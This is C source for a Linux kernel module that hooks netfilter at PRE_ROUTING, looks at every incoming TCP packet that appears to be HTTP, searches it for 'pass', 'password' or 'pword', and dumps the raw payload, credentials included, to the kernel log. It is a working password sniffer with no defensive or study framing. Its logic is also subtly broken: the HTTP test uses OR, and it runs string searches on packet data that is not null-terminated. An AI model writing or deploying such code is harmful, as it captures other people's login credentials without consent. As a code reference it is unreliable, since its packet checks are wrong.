#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>


MODULE_LICENSE("GPL");

static struct nf_hook_ops nfho;

static unsigned int ptcp_hook_func(const struct nf_hook_ops *ops,
                                   struct sk_buff *skb,
                                   const struct net_device *in,
                                   const struct net_device *out,
                                   int (*okfn)(struct sk_buff *))
{
    //IP4
    struct iphdr *iph;
    //TCP header        
    struct tcphdr *tcph;
    //will be our http data     
    unsigned char *data;   
    
    //if network packet is emty propuskaem
    if (skb) {
	/*ip header*/
        iph = ip_hdr(skb);

	/*if it tcp packet*/
	if (iph && (iph->protocol == IPPROTO_TCP)) {

		//tcp header
		tcph = tcp_hdr(skb);
		
		// the begin of tcp pocket
		data = (unsigned char *)((unsigned char *)tcph + (tcph->doff * 4));
               
		//PACKET is HTTP
	        if (data[0] == 'H' || data[1] == 'T' || data[2] == 'T' || data[3] == 'P')
		{
			/*we are looking password*/
    			bool flg1=strstr(data,"pass");
    			bool flg2=strstr(data,"password");
    			bool flg3=strstr(data,"pword");

    			printk(KERN_DEBUG "DATA");
    			if(flg1||flg2||flg3) {
			    printk(KERN_DEBUG "-------YES.found passw -----");
		            printk(KERN_DEBUG "%s\n", data);
                         
    			}
			else {
				printk(KERN_DEBUG "-------NO.noT found passw -----");
				 printk(KERN_DEBUG "%s\n", data);
				
			}
    			printk("\n");
		}
	    
	}
    }

    /*if network packet is emty propuskaem*/
   // if (!skb)
       // return NF_ACCEPT;
    /*if header*/
    //iph = ip_hdr(skb);       
    /*if it tcp packet*/
    //if (iph->protocol != IPPROTO_TCP)
       // return NF_ACCEPT;
    /*tcp header*/
    //tcph = tcp_hdr(skb);        
    /*TCP POCKET*/
    //data = (unsigned char *)((unsigned char *)tcph + (tcph->doff * 4));
    /*compare strings*/
   // bool flg1=strcmp(data,"pass");
   // bool flg2=strcmp(data,"password");
   // bool flg3=strcmp(data,"pword");

    //printk(KERN_DEBUG "DATA");
    //if(flg1||flg2||flg3) {
			    //printk(KERN_DEBUG "-------YES.found passw -----");
		            //printk(KERN_DEBUG "%s\n", data);
			  
                            
    //}
    //printk("\n");

    return NF_ACCEPT;
}

static int __init mod_init(void)
{
    int res;
    //hook function call function when all below condition is OK
    nfho.hook = (nf_hookfn *)ptcp_hook_func;  
    //called after packet received
    nfho.hooknum = NF_INET_PRE_ROUTING; 
    //packet filter - ipv4 packets        
    nfho.pf = PF_INET; 
    //setting high priority                        
    nfho.priority = NF_IP_PRI_FIRST; 
    //register hook   
    res = nf_register_net_hook(&init_net,&nfho);
    printk(KERN_DEBUG "Hello=>");
    return 0;
}

static void __exit mod_exit(void)
{
    nf_unregister_net_hook(&init_net,&nfho);
    printk(KERN_DEBUG "EXIT GOOD Buy=>");
}

module_init(mod_init);
module_exit(mod_exit);


